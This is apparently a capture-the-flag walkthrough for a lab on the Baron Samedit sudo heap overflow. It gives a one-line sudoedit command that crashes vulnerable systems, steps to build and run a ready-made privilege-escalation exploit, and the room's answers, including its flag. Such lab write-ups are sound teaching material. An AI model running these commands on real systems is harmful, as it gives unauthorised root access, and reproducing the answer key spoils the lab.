## Task 1 - Deploy!

------------

***Answer the questions below***

**Deployed!**

`No answer needed`

------------

## Task 2 - Baron Samedit

### Step 1

**Check if the System is Vulnerable**

`sudoedit -s '\' $(python3 -c' print("A"*1000)')`

> If the system is vulnerable then this will overwrite the heap buffer and crash the program

### Step 2

**Change Directory**

`cd Exploit`

### Step 3

**Make exploit**

You will see a file called "Makefile". This indicates that we can automatically compile the exploit simply by typing `make` and pressing enter.

> This will make a new file called `sudo-hax-me-a-sandwich`

### Step 4 

**Run exploit**

`./sudo-hax-me-a-sandwich`

------------
***Answer the Questions Below***

**After compiling the exploit, what is the name of the executable created (blurred in the screenshots above)?**

`sudo-hax-me-a-sandwich`

**You should now have a root shell -- what is the flag in `/root/flag.txt`?**

`THM{NmU4OWYwMWJmMjKxMDiYTU4MWIxNWVk}`